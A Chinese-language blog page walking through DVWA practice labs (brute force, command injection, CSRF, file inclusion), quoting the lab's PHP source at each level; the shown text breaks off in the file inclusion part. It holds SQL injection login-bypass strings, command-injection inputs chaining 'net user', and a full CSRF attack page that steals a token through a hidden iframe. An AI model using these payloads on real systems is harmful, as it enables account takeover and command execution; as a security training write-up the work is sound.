<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-dvwa" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/02/26/dvwa/" class="article-date">
  <time datetime="2021-02-26T15:14:04.000Z" itemprop="datePublished">2021-02-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/26/dvwa/">dvwa</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98-Brute-Force">第一题-Brute-Force</a></p>
<p><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98-Command-Injection">第二题-Command Injection</a></p>
<p><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98-CSRF">第三题-CSRF</a></p>
<p><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98File-Inclusion">第四题-File-Inclusion</a></p>
<p><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98-File-Upload">第五题-File Upload</a></p>
<p><a href="%E7%AC%AC%E5%85%AD%E9%A2%98-Insecure-CAPTCHA">第六题-Insecure CAPTCHA</a></p>
<p><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98-SQL-Injection">第七题-SQL-Injection</a></p>
<p><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98-SQL-Injection-(Blind)">第八题-SQL Injection (Blind)</a></p>
<p><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98-XSS-(Reflected)">第九题-XSS (Reflected)</a></p>
<p><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98-XSS-(Stored)">第十题-XSS (Stored)</a></p>
<h1 id="第一题-Brute-Force"><a href="#第一题-Brute-Force" class="headerlink" title="第一题-Brute-Force"></a>第一题-Brute-Force</h1><p><img src="https://image.3001.net/images/20161009/14760002264830.jpg!small"></p>
<h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>查看源代码</p>
   <?php

    if(isset($_GET['Login'])){
    //Getusername
    $user=$_GET['username'];

    //Getpassword
    $pass=$_GET['password'];
    $pass=md5($pass);

    //Checkthedatabase
    $query="SELECT*FROM`users`WHEREuser='$user'ANDpassword='$pass';";
    $result=mysql_query($query)ordie('<pre>'.mysql_error().'</pre>');

    if($result&&mysql_num_rows($result)==1){
    //Getusersdetails
    $avatar=mysql_result($result,0,"avatar");

    //Loginsuccessful
    echo"<p>Welcometothepasswordprotectedarea{$user}</p>";
    echo"<imgsrc="{$avatar}"/>";
    }
    else{
    //Loginfailed
    echo"<pre><br/>Usernameand/orpasswordincorrect.</pre>";
    }

    mysql_close();
    }

    ?><p>‘</p>
<p>可以看到，服务器只是验证了参数Login是否被设置（isset函数在php中用来检测变量是否设置，该函数返回的是布尔类型的值，即true/false），没有任何的防爆破机制，且对参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>（1）burpsuit<br>    第一步抓包<br><img src="https://image.3001.net/images/20161009/14760003309956.png!small"><br>    第二步，ctrl+I将包复制到intruder模块，因为要对password参数进行爆破，所以在password参数的内容两边加$<br><img src="https://image.3001.net/images/20161009/147600029633.png!small"><br>    第三步选中Payloads，载入字典，点击Start attack进行爆破<br><img src="https://image.3001.net/images/20161009/14760003769188.png!small"><br>最后，尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。<br><img src="https://image.3001.net/images/20161009/14760004176934.png!small"><br>(2)sql注入<br>万能密钥<br>admin’or ‘1’=’1<br>admin’ – -<br>admin’ # </p>
<p>注入成功<br><img src="https://image.3001.net/images/20161009/14760004593118.png!small"></p>
<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p>
<hr>
<p>`&lt;?php</p>
<p>if(isset($_GET[‘Login’])){<br>//Sanitiseusernameinput<br>$user=$_GET[‘username’];<br>$user=mysql_real_escape_string($user);</p>
<p>//Sanitisepasswordinput<br>$pass=$_GET[‘password’];<br>$pass=mysql_real_escape_string($pass);<br>$pass=md5($pass);</p>
<p>//Checkthedatabase<br>$query=”SELECT*FROM<code>users</code>WHEREuser=’$user’ANDpassword=’$pass’;”;<br>$result=mysql_query($query)ordie(‘<pre>'.mysql_error().'</pre>‘);</p>
<p>if($result&amp;&amp;mysql_num_rows($result)==1){<br>//Getusersdetails<br>$avatar=mysql_result($result,0,”avatar”);</p>
<p>//Loginsuccessful<br>echo”<p>Welcometothepasswordprotectedarea{$user}</p>“;<br>echo”&lt;imgsrc=”{$avatar}”/&gt;”;<br>}<br>else{<br>//Loginfailed<br>sleep(2);<br>echo”<pre><br/>Usernameand/orpasswordincorrect.</pre>“;<br>}</p>
<p>mysql_close();<br>}</p>
<p>?&gt;</p>
<hr>
<p>sql注入失效，但burtsuit仍然可用</p>
<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>源代码</p>
<hr>
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = mysql_real_escape_string( $user );

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = mysql_real_escape_string( $pass );
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );

    if( $result && mysql_num_rows( $result ) == 1 ) {
        // Get users details
        $avatar = mysql_result( $result, 0, "avatar" );

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    mysql_close();
}

// Generate Anti-CSRF token
generateSessionToken();

?><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p>可以发现，每次发送的时候，都带上了一个 user_token，每次发送请求的时候 user_token 都是会变的，而 user_token 是来自于上一个数据包的。<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938323-247510334.jpg"><br>使用burpsuit爆破</p>
<p>依次选择【Project options】-&gt;【Sessions】-&gt;【add】-&gt; 【add a Rule Description】-&gt; 【Run a macro(宏)】</p>
<p>选择新建宏<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155937317-848154105.jpg"><br>添加的时候，选择配置<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155939617-165513722.jpg"><br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938529-1012197189.jpg"></p>
<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><?php

if( isset( $_POST[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_POST[ 'username' ];
    $user = stripslashes( $user );
    $user = mysql_real_escape_string( $user );

    // Sanitise password input
    $pass = $_POST[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = mysql_real_escape_string( $pass );
    $pass = md5( $pass );

    // Default values
    $total_failed_login = 3;
    $lockout_time       = 15;
    $account_locked     = false;

    // Check the database (Check user information)
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // Check to see if the user has been locked out.
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
        // User locked out.  Note, using this method would allow for user enumeration!
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

        // Calculate when the user would be allowed to login again
        $last_login = $row[ 'last_login' ];
        $last_login = strtotime( $last_login );
        $timeout    = strtotime( "{$last_login} +{$lockout_time} minutes" );
        $timenow    = strtotime( "now" );

        // Check to see if enough time has passed, if it hasn't locked the account
        if( $timenow > $timeout )
            $account_locked = true;
    }

    // Check the database (if username matches the password)
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR);
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // If its a valid login...
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
        // Get users details
        $avatar       = $row[ 'avatar' ];
        $failed_login = $row[ 'failed_login' ];
        $last_login   = $row[ 'last_login' ];

        // Login successful
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
        echo "<img src=\"{$avatar}\" />";

        // Had the account been locked out since last login?
        if( $failed_login >= $total_failed_login ) {
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";
        }

        // Reset bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }
    else {
        // Login failed
        sleep( rand( 2, 4 ) );

        // Give the user some feedback
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

        // Update bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }

    // Set the last login time
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><p>错误三次后会锁定15分钟以上</p>
<p>burp爆破关键词<br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938064-1430455794.jpg"><br><img src="https://img2018.cnblogs.com/blog/1124357/201908/1124357-20190801155938250-1479654924.jpg"></p>
<h1 id="第二题-Command-Injection"><a href="#第二题-Command-Injection" class="headerlink" title="第二题-Command-Injection"></a>第二题-Command-Injection</h1><p><img src="https://image.3001.net/images/20161016/14765776616648.png!small"></p>
<h2 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h2><p>源代码</p>
<hr>
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Get input 

    $target = $_REQUEST[ 'ip' ]; 

    // Determine OS and execute the ping command. 

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

        // Windows 

        $cmd = shell_exec( 'ping  ' . $target ); 

    } 

    else { 

        // *nix 

        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

    } 

    // Feedback for the end user 

    echo "<pre>{$cmd}</pre>"; 

} 

?><p> </p>
<hr>
<p>相关函数介绍 </p>
<p>stristr(string,search,before_search)</p>
<p>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为”false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p>
<p>php_uname(mode)</p>
<p>这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式），”s ”（返回操作系统名称），”n”（返回主机名），” r”（返回版本名称），”v”（返回版本信息）， ”m”（返回机器类型）。</p>
<p>可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。</p>
<p>漏洞利用</p>
<p>window和linux系统都可以用&amp;&amp;来执行多条命令</p>
<p>127.0.0.1&amp;&amp;net user<br><img src="https://img-blog.csdnimg.cn/20190615092332469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
<h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p>
<hr>
<?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Get input 

    $target = $_REQUEST[ 'ip' ]; 

    // Set blacklist 

    $substitutions = array( 

        '&&' => '', 

        ';'  => '', 

    ); 

    // Remove any of the charactars in the array (blacklist). 

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

        // Windows 

        $cmd = shell_exec( 'ping  ' . $target ); 

    } 

    else { 

        // *nix 

        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

    } 

    // Feedback for the end user 

    echo "<pre>{$cmd}</pre>"; 

} 

?>
<hr>
<p>可以看到，相比Low级别的代码，服务器端对ip参数做了一定过滤，即把”&amp;&amp;” 、”;”删除，本质上采用的是黑名单机制，因此依旧存在安全问题。</p>
<p>漏洞利用</p>
<p>1、127.0.0.1&amp;net user</p>
<p>因为被过滤的只有”&amp;&amp;”与” ;”，所以”&amp;”不会受影响。<br>  ![]<a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190615092359423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70">https://img-blog.csdnimg.cn/20190615092359423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70</a>)</p>
<h2 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h2><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Get input 

    $target = trim($_REQUEST[ 'ip' ]); 

    // Set blacklist 

    $substitutions = array( 

        '&'  => '', 

        ';'  => '', 

        '|  ' => '', 

        '-'  => '', 

        '$'  => '', 

        '('  => '', 

        ')'  => '', 

        '`'  => '', 

        '||' => '', 

    ); 

    // Remove any of the charactars in the array (blacklist). 

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

        // Windows 

        $cmd = shell_exec( 'ping  ' . $target ); 

    } 

    else { 

        // *nix 

        $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

    } 

    // Feedback for the end user 

    echo "<pre>{$cmd}</pre>"; 

} 

?><h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><p>漏洞利用</p>
<p>黑名单看似过滤了所有的非法字符，但仔细观察到是把”| ”（注意这里|后有一个空格）替换为空字符，于是 ”|”成了“漏网之鱼”。</p>
<p>127.0.0.1|net user<br><img src="https://img-blog.csdnimg.cn/20190615092435426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FpXzY0,size_16,color_FFFFFF,t_70"></p>
<h2 id="impossible-1"><a href="#impossible-1" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_POST[ 'Submit' ]  ) ) { 

    // Check Anti-CSRF token 

    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 

    $target = $_REQUEST[ 'ip' ]; 

    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 

    $octet = explode( ".", $target ); 

    // Check IF each octet is an integer 

    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) { 

        // If all 4 octets are int's put the IP back together. 

        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3]; 

        // Determine OS and execute the ping command. 

        if( stristr( php_uname( 's' ), 'Windows NT' ) ) { 

            // Windows 

            $cmd = shell_exec( 'ping  ' . $target ); 

        } 

        else { 

            // *nix 

            $cmd = shell_exec( 'ping  -c 4 ' . $target ); 

        } 

        // Feedback for the end user 

        echo "<pre>{$cmd}</pre>"; 

    } 

    else { 

        // Ops. Let the user name theres a mistake 

        echo '<pre>ERROR: You have entered an invalid IP.</pre>'; 

    } 

} 

// Generate Anti-CSRF token 

generateSessionToken(); 

?><h2 id="-3"><a href="#-3" class="headerlink" title=" "></a> </h2><h2 id="impossible等级，对命令注入行为正确防护。"><a href="#impossible等级，对命令注入行为正确防护。" class="headerlink" title="impossible等级，对命令注入行为正确防护。"></a>impossible等级，对命令注入行为正确防护。</h2><p>基础知识补充</p>
<p>命令区别（&amp;、|、&amp;&amp;、||）</p>
<p>&amp;起到连接命令的作用，不管前一条命令是否执行成功，下一条都会接着执行。</p>
<p>|起到管道的作用，前一条命令的输出，作为下一条命令的输入，只打印最后一条命令的执行结果。</p>
<p>&amp;&amp;表示当前面的命令执行成功后，它后面的命令才被执行<br>||表示前面的命令执行失败，它后面的命令才被执行</p>
<hr>
<h1 id="第三题-CSRF"><a href="#第三题-CSRF" class="headerlink" title="第三题-CSRF"></a>第三题-CSRF</h1><p><img src="https://image.3001.net/images/20161031/14778952387559.png!small"></p>
<h2 id="low-2"><a href="#low-2" class="headerlink" title="low"></a>low</h2><hr>
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Get input 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
    } 

    mysql_close(); 
} 

?>
<hr>
<p>我们先对其抓包<br><img src="https://pics6.baidu.com/feed/bf096b63f6246b6063db7560e030c64a500fa218.png?token=3c675db8b5bea99d52b32d66762db004"><br><img src="https://pics5.baidu.com/feed/2fdda3cc7cd98d109809c16c2cf7640879ec90d9.png?token=bf67d2385e4585ff9935704e348aea6e"><br>也就是说，当我们访问<a target="_blank" rel="noopener" href="http://127.0.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change%E6%88%91%E4%BB%AC%E7%9A%84%E5%AF%86%E7%A0%81%E5%B0%B1%E4%BC%9A%E6%94%B9%E5%8F%98%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E4%BC%AA%E9%80%A0%E8%BF%99%E6%9D%A1%E9%93%BE%E6%8E%A5%EF%BC%8C%E5%8F%91%E9%80%81%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85%EF%BC%8C%E5%9C%A8%E4%B8%8D%E7%9F%A5%E4%B8%8D%E8%A7%89%E4%B8%AD%E5%AF%B9%E6%96%B9%E7%9A%84%E5%AF%86%E7%A0%81%E5%B0%B1%E4%BC%9A%E8%A2%AB%E4%BF%AE%E6%94%B9%E3%80%82">http://127.0.0.1/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change我们的密码就会改变，我们可以伪造这条链接，发送给受害者，在不知不觉中对方的密码就会被修改。</a></p>
<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><h2 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Checks to see where the request came from 
    if( eregi( $_SERVER[ 'SERVER_NAME' ], $_SERVER[ 'HTTP_REFERER' ] ) ) { 
        // Get input 
        $pass_new  = $_GET[ 'password_new' ]; 
        $pass_conf = $_GET[ 'password_conf' ]; 

        // Do the passwords match? 
        if( $pass_new == $pass_conf ) { 
            // They do! 
            $pass_new = mysql_real_escape_string( $pass_new ); 
            $pass_new = md5( $pass_new ); 

            // Update the database 
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
            $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

            // Feedback for the user 
            echo "<pre>Password Changed.</pre>"; 
        } 
        else { 
            // Issue with passwords matching 
            echo "<pre>Passwords did not match.</pre>"; 
        } 
    } 
    else { 
        // Didn't come from a trusted source 
        echo "<pre>That request didn't look correct.</pre>"; 
    } 

    mysql_close(); 
} 

?><h2 id="-4"><a href="#-4" class="headerlink" title=" "></a> </h2><p>可以看到，Medium级别的代码检查了保留变量 HTTP_REFERER（http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME（http包头的Host参数，及要访问的主机名，这里是192.168.153.130），希望通过这种机制抵御CSRF攻击。</p>
<p>过滤规则是http包头的Referer参数的值中必须包含主机名（这里是192.168.153.130）</p>
<p>我们可以将攻击页面命名为192.168.153.130.html（页面被放置在攻击者的服务器里，这里是10.4.253.2）就可以绕过了</p>
<p>下面是Burpsuite的截图<br><img src="https://image.3001.net/images/20161031/1477895636890.png!small"></p>
<p>Referer参数完美绕过过滤规则</p>
<p><img src="https://image.3001.net/images/20161031/14778956835405.png!small"></p>
<p>密码修改成功<br><img src="https://image.3001.net/images/20161031/14778957125554.png!small"></p>
<h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><hr>
<?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Do the passwords match? 
    if( $pass_new == $pass_conf ) { 
        // They do! 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update the database 
        $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';"; 
        $result = mysql_query( $insert ) or die( '<pre>' . mysql_error() . '</pre>' ); 

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match.</pre>"; 
    } 

    mysql_close(); 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?><h2 id="-5"><a href="#-5" class="headerlink" title=" "></a> </h2><p>可以看到，High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<h2 id="构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。"><a href="#构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。" class="headerlink" title="构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。"></a>构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</h2><script type="text/javascript">

    function attack()

  {

   document.getElementsByName('user_token')[0].value=document.getElementById("hack").contentWindow.document.getElementsByName('user_token')[0].value;

  document.getElementById("transfer").submit(); 

  }

</script>



<iframe src="http://192.168.153.130/dvwa/vulnerabilities/csrf" id="hack" border="0" style="display:none;">

</iframe>



<body onload="attack()">

  <form method="GET" id="transfer" action="http://192.168.153.130/dvwa/vulnerabilities/csrf">

   <input type="hidden" name="password_new" value="password">

<pre><code>&lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;password&quot;&gt;</code></pre>
   <input type="hidden" name="user_token" value="">

  <input type="hidden" name="Change" value="Change">

   </form>

</body>

<hr>
<p>攻击思路是当受害者点击进入这个页面，脚本会通过一个看不见框架偷偷访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，以完成CSRF攻击。</p>
<h2 id="impossible-2"><a href="#impossible-2" class="headerlink" title="impossible"></a>impossible</h2><h2 id="源代码-4"><a href="#源代码-4" class="headerlink" title="源代码"></a>源代码</h2><?php 

if( isset( $_GET[ 'Change' ] ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); 

    // Get input 
    $pass_curr = $_GET[ 'password_current' ]; 
    $pass_new  = $_GET[ 'password_new' ]; 
    $pass_conf = $_GET[ 'password_conf' ]; 

    // Sanitise current password input 
    $pass_curr = stripslashes( $pass_curr ); 
    $pass_curr = mysql_real_escape_string( $pass_curr ); 
    $pass_curr = md5( $pass_curr ); 

    // Check that the current password is correct 
    $data = $db->prepare( 'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); 
    $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
    $data->bindParam( ':password', $pass_curr, PDO::PARAM_STR ); 
    $data->execute(); 

    // Do both new passwords match and does the current password match the user? 
    if( ( $pass_new == $pass_conf ) && ( $data->rowCount() == 1 ) ) { 
        // It does! 
        $pass_new = stripslashes( $pass_new ); 
        $pass_new = mysql_real_escape_string( $pass_new ); 
        $pass_new = md5( $pass_new ); 

        // Update database with new password 
        $data = $db->prepare( 'UPDATE users SET password = (:password) WHERE user = (:user);' ); 
        $data->bindParam( ':password', $pass_new, PDO::PARAM_STR ); 
        $data->bindParam( ':user', dvwaCurrentUser(), PDO::PARAM_STR ); 
        $data->execute(); 

        // Feedback for the user 
        echo "<pre>Password Changed.</pre>"; 
    } 
    else { 
        // Issue with passwords matching 
        echo "<pre>Passwords did not match or current password incorrect.</pre>"; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?><h2 id="-6"><a href="#-6" class="headerlink" title=" "></a> </h2><p>可以看到，Impossible级别的代码要求用户输入原始密码，攻击者在不知道原始密码的情况下，无法进行CSRF攻击。</p>
<h1 id="第四题File-Inclusion"><a href="#第四题File-Inclusion" class="headerlink" title="第四题File-Inclusion"></a>第四题File-Inclusion</h1><p><img src="https://image.3001.net/images/20161106/14784220172185.png!small"></p>
<h2 id="low-3"><a href="#low-3" class="headerlink" title="low"></a>low</h2><h2 id="源代码-5"><a href="#源代码-5" class="headerlink" title="源代码"></a>源代码</h2><?php 
// The page we wish to display 
$file = $_GET[ 'page' ]; 
?><h2 id="-7"><a href="#-7" class="headerlink" title=" "></a> </h2><p>我们先点击file1.php效果如下：<br><img src="https://pics4.baidu.com/feed/48540923dd54564e458a3432b8164084d0584f19.png?token=8e0df337e643d14699f8db6f835c1bef"><br>在burp中对其抓包<br><img src="https://pics4.baidu.com/feed/91529822720e0cf3165ae065028e2e19bc09aaca.png?token=d4a6d4ad5105c98fa81a5e9f0778d4cb"><br>读取任意文件测试，我们在D盘新建一个txt构造下面命令：读取d盘下的bbskali.txt文件<br><img src="https://pics2.baidu.com/feed/838ba61ea8d3fd1f21b1fa183a86f91994ca5fa2.png?token=a1414ce9fd591db547742e5071095679"><br>访问远程文件<br><img src="https://pics3.baidu.com/feed/d1a20cf431adcbefca128176bd67f2dba2cc9fef.png?token=d74cdf0e394b5f46d043286cb3c4e6f3"></p>
<h2 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h2><hr>
<p>&lt;php</p>
<p>//Thepagewewishtodisplay<br>$file=$_GET[‘page’];</p>
